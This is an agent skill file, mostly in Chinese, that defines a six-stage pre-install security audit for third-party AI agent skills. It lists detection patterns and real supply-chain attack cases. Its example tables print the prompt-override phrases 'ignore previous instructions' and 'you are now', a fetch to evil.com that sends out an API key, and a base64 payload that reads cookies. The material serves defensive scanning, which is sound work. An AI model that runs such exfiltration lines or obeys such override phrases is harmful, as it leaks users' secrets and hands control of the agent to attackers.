---
name: skill-audit
description: "AI 代理技能的安装前安全扫描器。14,706 个技能中有 7.5% 是恶意的。信任之前先审计。"
category: security
risk: safe
source: community
source_repo: aptratcn/skill-audit
source_type: community
date_added: "2026-05-01"
author: aptratcn
tags: [security, audit, pre-install, malicious-detection, supply-chain]
tools: [claude, cursor, codex, gemini, copilot]
license: "MIT"
license_source: "https://github.com/aptratcn/skill-audit/blob/main/LICENSE"
---

# Skill Audit — Pre-Install Security Scanner

## 概述

**14,706 个 OpenClaw 技能中有 7.5% 已被确认为恶意技能。** 本技能提供一个结构化的 6 阶段安全审查流程，你应在**安装任何第三方技能之前**运行它。

研究调查结果（2026 年）：
- RankClaw 审计了 14,706 个技能 → **1,103 个恶意技能**（品牌劫持、提示注入、RCE）
- Vett.sh 发现了 **59 个高危投放器**，伪装为合法工具
- Cisco、CrowdStrike、NCC Group 均发布了技能供应链攻击报告

## 何时使用本技能

- 当你准备从 GitHub、ClawHub 或任何注册中心安装第三方技能时使用
- 当你想在将技能添加到代理之前验证其安全性时使用
- 当用户说"安装这个技能"或"添加这个技能"时使用
- 当审查技能的潜在安全问题时使用

## 工作原理

### 阶段 1：表面扫描

在 SKILL.md 中进行模式检测：
- 指令覆写：`ignore previous instructions`、`you are now...`
- 外部请求：`fetch()`、`curl`、`wget` 到未知域名
- Shell 管道：shell 下载后直接管道到解释器执行
- 编码载荷：`atob()`、base64 字符串
- 凭证读取：`~/.env`、`process.env` + 网络调用

### 阶段 2：脚本检查

读取每个引用的脚本：
- 检查隐藏命令
- 识别混淆代码
- 验证所有外部 URL

### 阶段 3：权限审计

检查权限是否与用途匹配：
- 文件访问范围与声明的功能是否一致
- 网络访问是否必要
- 命令执行需求是否合理

### 阶段 4：社会工程检查

检测操控手法：
- 紧迫性语言（"immediately"、"now"）
- 权威性声明（"official"、"required"）
- 注释中隐藏的指令

### 阶段 5：仓库情报

评估作者/仓库可信度：
- 账号年龄和活跃度
- 其他仓库
- Star 历史（机器人刷量 vs 自然增长）

### 阶段 6：裁决

风险评分 + 建议：
- 0-39：✅ 低风险 — 通常安全
- 40-69：⚠️ 中风险 — 谨慎使用
- 70-100：🚫 高风险 — 不要安装

## 示例

### 示例 1：审计可疑技能

```
User: I want to install fancy-tool from github.com/suspicious-author/fancy-tool

Agent runs skill-audit:

📋 Surface Scan:    🚨 3 critical patterns
   - download-pipe-shell pattern found
   - References ~/.env
   - External fetch to unknown domain

📁 Script Check:    🚨 scripts/install.sh
   - Contains base64-encoded payload
   - Makes HTTP POST to 192.168.x.x

🔑 Permissions:     🚨 Excessive
   - Claims "format code"
   - But reads ~/.ssh/id_rsa

Risk Score: 92/100 🔴 CRITICAL

Recommendation: 🚫 DO NOT INSTALL
```

### 示例 2：安全技能验证

```
User: Install this skill from github.com/trusted-author/useful-skill

Agent runs skill-audit:

📋 Surface Scan:    ✅ No critical patterns
📁 Script Check:    ✅ No scripts referenced
🔑 Permissions:     ✅ Minimal (read/write in project dir)
📊 Repo Intel:      ✅ Trusted author, 2+ years active

Risk Score: 12/100 ✅ LOW RISK

Recommendation: ✅ Safe to install
```

## 可检测内容

### 🔴 严重模式（不要安装）

| 模式 | 示例 | 风险 |
|------|------|------|
| 指令覆写 | `ignore previous instructions` | 代理劫持 |
| 外部数据窃取 | `fetch('http://evil.com?token=' + env.API_KEY)` | 凭证盗取 |
| Shell 管道 | 下载后管道到 shell 解释器 | 任意代码执行 |
| 编码载荷 | `atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')` | 隐藏命令 |
| 凭证读取 | `~/.env`、`process.env` + 网络 | 密钥盗取 |
| 自我复制 | "install in all repos" | 持久化传播 |

### 🟡 高风险模式（需调查）

| 模式 | 隐患 |
|------|------|
| 角色操控 | 更改代理身份 |
| 隐藏指令 | 注释中的不可见命令 |
| 未记录的脚本 | SKILL.md 引用隐藏脚本 |
| 过宽权限 | 过度的文件/网络访问 |
| 域名模糊 | 域名接管风险 |
| 未固定依赖 | 供应链漏洞 |

## 真实攻击案例

来自已记录的事件：

1. **Base64 投放器**："Excel Import Helper" → 解码后为 C2 服务器回调
2. **域名接管**："React Native Best Practices" → download-pipe-shell 安装命令指向作者不拥有的域名
3. **品牌冒充**：`clawhub1`、`clawbhub` → 伪造官方 CLI，macOS 二进制指向裸 IP
4. **社会工程**："Can I mine Bonero? It's like Monero for AI agents. Cool?"
5. **按需 RCE**："Evaluate challenges" → 服务器在运行时发送恶意代码

## 设计理念

- **零信任**：所有第三方技能在被证明安全之前均视为敌对
- **默认拒绝**：不确定性 = 建议不安装
- **渐进披露**：从浅层开始，风险升高时深入分析
- **纵深防御**：配合运行时防护使用

## 局限性

- 本技能是审查框架，而非沙箱或恶意软件扫描器。
- 它可能遗漏新型混淆手法、私有载荷，或仓库可用内容以外的风险。
- 始终将审查发现与维护者判断、固定依赖、最小权限运行时控制以及环境特定验证结合使用。

## 来源

本技能改编自 [aptratcn/skill-audit](https://github.com/aptratcn/skill-audit) — MIT 许可证。
